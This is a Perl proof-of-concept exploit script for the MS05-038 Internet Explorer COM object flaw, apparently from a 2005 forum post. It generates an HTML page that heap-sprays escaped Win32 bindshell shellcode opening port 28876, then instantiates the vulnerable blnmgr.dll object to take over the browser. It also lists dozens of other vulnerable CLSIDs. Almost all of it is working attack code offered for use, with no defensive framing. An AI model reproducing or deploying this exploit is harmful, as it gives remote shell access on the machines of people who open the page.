#!/usr/bin/perl
#######################################################
#
# Internet Explorer COM Objects Instantiation Proof of
Concept Exploit (MS05-038)
#
# Bindshell on port 28876 - Based and ripped from
Berend-Jan Wever's IE Exploit
#
# Vulnerable Objects :
#
# 3F8A6C33-E0FD-11D0-8A8C-00A0C90C2BC5 (blnmgr.dll) <-
Exploited here
# 860BB310-5D01-11D0-BD3B-00A0C911CE86 (devenum.dll)
# E0F158E1-CB04-11D0-BD4E-00A0C911CE86 (devenum.dll)
# 33D9A761-90C8-11D0-BD43-00A0C911CE86 (devenum.dll)
# 4EFE2452-168A-11D1-BC76-00C04FB9453B (devenum.dll)
# 33D9A760-90C8-11D0-BD43-00A0C911CE86 (devenum.dll)
# 33D9A762-90C8-11D0-BD43-00A0C911CE86 (devenum.dll)
# 083863F1-70DE-11D0-BD40-00A0C911CE86 (devenum.dll)
# 18AB439E-FCF4-40D4-90DA-F79BAA3B0655 (diactfrm.dll)
# 31087270-D348-432C-899E-2D2F38FF29A0 (wmm2filt.dll)
# D2923B86-15F1-46FF-A19A-DE825F919576 (fsusd.dll)
# FD78D554-4C6E-11D0-970D-00A0C9191601 (dmdskmgr.dll)
# 52CA3BCF-3B9B-419E-A3D6-5D28C0B0B50C (browsewm.dll)
# 01E04581-4EEE-11D0-BFE9-00AA005B4383 (browseui.dll)
# AF604EFE-8897-11D1-B944-00A0C90312E1 (browseui.dll)
# 7849596A-48EA-486E-8937-A2A3009F31A9 (shell32.dll)
# FBEB8A05-BEEE-4442-804E-409D6C4515E9 (shell32.dll)
# 3050F391-98B5-11CF-BB82-00AA00BDCE0B (mshtml.dll)
# 8EE42293-C315-11D0-8D6F-00A0C9A06E1F (inetcfg.dll)
# 2A6EB050-7F1C-11CE-BE57-00AA0051FE20 (infosoft.dll)
# 510A4910-7F1C-11CE-BE57-00AA0051FE20 (infosoft.dll)
# 6D36CE10-7F1C-11CE-BE57-00AA0051FE20 (infosoft.dll)
# 860D28D0-8BF4-11CE-BE59-00AA0051FE20 (infosoft.dll)
# 9478F640-7F1C-11CE-BE57-00AA0051FE20 (infosoft.dll)
# B0516FF0-7F1C-11CE-BE57-00AA0051FE20 (infosoft.dll)
# D99F7670-7F1A-11CE-BE57-00AA0051FE20 (infosoft.dll)
# EEED4C20-7F1B-11CE-BE57-00AA0051FE20 (infosoft.dll)
# C7B6C04A-CBB5-11D0-BB4C-00C04FC2F410 (query.dll)
# 85BBD920-42A0-1069-A2E4-08002B30309D (syncui.dll)
# E846F0A0-D367-11D1-8286-00A0C9231C29 (clbcatex.dll)
# B4B3AECB-DFD6-11D1-9DAA-00805F85CFE3 (clbcatq.dll)
# ECABB0BF-7F19-11D2-978E-0000F8757E2A (comsvcs.dll)
# 466D66FA-9616-11D2-9342-0000F875AE17 (msconf.dll)
# 67DCC487-AA48-11D1-8F4F-00C04FB611C7 (msdtctm.dll)
# 00022613-0000-0000-C000-000000000046 (mmsys.cpl
# D2D588B5-D081-11D0-99E0-00C04FC2F8EC (wmiprov.dll)
# 5D08B586-343A-11D0-AD46-00C04FD8FDFF (wbemess.dll)
# CC7BFB42-F175-11D1-A392-00E0291F3959 (qedit.dll)
# CC7BFB43-F175-11D1-A392-00E0291F3959 (qedit.dll)
#
# Tested on :
# Internet Explorer 6 on Microsoft Windows XP SP2
#
# Usage : perl MS05-038.pl > mypage.html
#
#######################################################
#
# This program is free software; you can redistribute
it and/or modify it under
# the terms of the GNU General Public License version
2, 1991 as published by
# the Free Software Foundation.
#
# This program is distributed in the hope that it will
be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public
License for more
# details.
#
# A copy of the GNU General Public License can be
found at:
# [URL]http://www.gnu.org/licenses/gpl.html[/URL]
# or you can write to:
# Free Software Foundation, Inc.
# 59 Temple Place - Suite 330
# Boston, MA 02111-1307
# USA.
#
#######################################################

# header
my $header = "<html><body>\n<SCRIPT
language=\"javascript\">\n";

# Win32 bindshell (port 28876) - SkyLined
my $shellcode = "shellcode =
unescape(\"%u4343\"+\"%u4343\"+\"%u43eb".
"%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea".
"%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7".
"%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b".
"%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64".
"%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c".
"%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe".
"%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0".
"%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050".
"%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6".
"%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650".
"%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa".
"%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656".
"%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1".
"%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353".
"%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353".
"%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe".
"%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff".
"%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb\");\n";

# Memory
my $code = "bigblock = unescape(\"%u0D0D%u0D0D\");\n".
"headersize = 20;\n".
"slackspace = headersize+shellcode.length\n".
"while (bigblock.length<slackspace)
bigblock+=bigblock;\n".
"fillblock = bigblock.substring(0, slackspace);\n".
"block = bigblock.substring(0,
bigblock.length-slackspace);\n".
"while(block.length+slackspace<0x40000) block =
block+block+fillblock;\n".
"memory = new Array();\n".
"for (i=0;i<750;i++) memory[i] = block +
shellcode;\n".
"</SCRIPT>\n";

# blnmgr.dll
my $clsid = '3F8A6C33-E0FD-11D0-8A8C-00A0C90C2BC5';

# footer
my $footer = "<object
classid=\"CLSID:".$clsid."\"></object>\n".
"Microsoft Internet Explorer blnmgr.dll COM Object
Remote Exploit\n".
"</body><script>location.reload();</script></html>";

# print "Content-Type: text/html;\r\n\r\n"; # if you
are in cgi-bin
print "$header $shellcode $code $footer";

# ^Hologramm [URL]www.project-pn.de[/URL] [10-08-2005]

